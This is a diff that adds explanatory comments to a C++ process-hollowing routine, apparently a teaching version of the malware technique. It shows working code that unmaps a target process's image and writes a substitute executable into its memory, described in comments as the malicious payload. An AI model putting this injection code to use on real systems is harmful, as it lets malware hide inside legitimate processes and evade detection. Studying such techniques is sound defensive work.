@@ -14,10 +14,10 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 	printf("Creating process\r\n");		// To be printed in the CMD.
 
 	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();	/* Contains information which is used to control how the process 
-														   behaves and appears on startup. */
+								   behaves and appears on startup. */
 
 	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();	  /* Contains information about a newly created 
-														   				 process and its primary thread. */
+									     process and its primary thread. */
 	CreateProcessA		//	The function used to create a process.
 	(
 		0,
@@ -45,13 +45,13 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 
 	printf("Opening source image\r\n");
 
-	HANDLE hFile = CreateFileA
+	HANDLE hFile = CreateFileA		//	This function creates or opens a file or an I/O device.
 	(
-		pSourceFile,
-		GENERIC_READ, 
+		pSourceFile,		//	The directory of HelloWorld.exe we initially set to "CreateHollowedProcess".
+		GENERIC_READ,		//	The access right.
 		0, 
 		0, 
-		OPEN_ALWAYS, 
+		OPEN_ALWAYS,		//	If the specified file exists, the function succeeds.
 		0, 
 		0
 	);
@@ -67,20 +67,22 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 	DWORD dwBytesRead = 0;
 	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);
 
-	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
+	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);	/*	Calling the "GetLoadedImage" functiom in order to
+										get the pointer to the source image.	*/
 
-	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);
+	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);	/*	Calling the "GetNTHeadrs" functiom in order to
+											get the pointer to the source image's headrs.	*/
 
 	printf("Unmapping destination section\r\n");
 
-	HMODULE hNTDLL = GetModuleHandleA("ntdll");
+	HMODULE hNTDLL = GetModuleHandleA("ntdll");		//	Used to get the handles from a module that was already loaded.
 
-	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
+	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");	//	Used to get the function we require from ntdll.
 
 	_NtUnmapViewOfSection NtUnmapViewOfSection =
 		(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
 
-	DWORD dwResult = NtUnmapViewOfSection
+	DWORD dwResult = NtUnmapViewOfSection		//	The actual setting of the function in order to unmap a section.
 	(
 		pProcessInfo->hProcess, 
 		pPEB->ImageBaseAddress
@@ -94,8 +96,8 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 
 	printf("Allocating memory\r\n");
 
-	PVOID pRemoteImage = VirtualAllocEx
-	(
+	PVOID pRemoteImage = VirtualAllocEx		//	Reserves, commits, or changes the state of a region of memory 
+	(						//	within the virtual address space of a specified process.
 		pProcessInfo->hProcess,
 		pPEB->ImageBaseAddress,
 		pSourceHeaders->OptionalHeader.SizeOfImage,
@@ -109,8 +111,8 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 		return;
 	}
 
-	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -
-		pSourceHeaders->OptionalHeader.ImageBase;
+	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -		//	This is the calculation of the delta between the 'source' 
+		pSourceHeaders->OptionalHeader.ImageBase;	//	and 'destination' memory addresses.
 
 	printf
 	(
@@ -126,11 +128,11 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 
 	printf("Relocation delta: 0x%p\r\n", dwDelta);
 
-	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;
+	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;		// Assigning the 'destination' image pointer as the 'source' image pointer.
 
 	printf("Writing headers\r\n");
 
-	if (!WriteProcessMemory
+	if (!WriteProcessMemory			//	Used to write the malicious payload to the remote process.
 	(
 		pProcessInfo->hProcess, 				
 		pPEB->ImageBaseAddress, 
@@ -168,12 +170,12 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 		}
 	}	
 
-	if (dwDelta)
-		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
+	if (dwDelta)	//	Checking if the delta between the 'destination' and 'source' images is not 0.
+		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)			
 		{
-			const char pSectionName[] = ".reloc";		
+			const char pSectionName[] = ".reloc";						
 
-			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
+			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))		//	Getting ready to use the ".reloc" section.
 				continue;
 
 			printf("Rebasing image\r\n");
@@ -182,9 +184,9 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 			DWORD dwOffset = 0;
 
 			IMAGE_DATA_DIRECTORY relocData = 
-				pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+				pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];		//	The pointer to the relocation table.	
 
-			while (dwOffset < relocData.Size)
+			while (dwOffset < relocData.Size)	
 			{
 				PBASE_RELOCATION_BLOCK pBlockheader = 
 					(PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
